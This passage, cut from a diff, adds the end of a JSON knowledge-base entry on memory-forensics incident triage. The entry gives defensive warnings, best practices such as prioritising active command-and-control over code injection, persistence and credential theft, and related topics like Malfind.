+            }
+          ],
+          "warnings": [
+            "Triage provides indicators, not complete analysis",
+            "Some sophisticated threats won't appear in quick triage",
+            "False positives possible - verify before taking action",
+            "Document findings even from initial triage"
+          ],
+          "best_practices": [
+            "Follow consistent triage order for reproducibility",
+            "Document all findings immediately",
+            "Brief stakeholders on initial findings within 30 minutes",
+            "Prioritize: active C2 > code injection > persistence > credential theft",
+            "Contain identified threats before deep analysis",
+            "Deep dive based on triage findings, not random plugins"
+          ],
+          "related_cves": [],
+          "related_topics": ["Process Analysis", "Network Analysis", "Malfind"]
+        }
+      ]
+    }
+  ]
+}
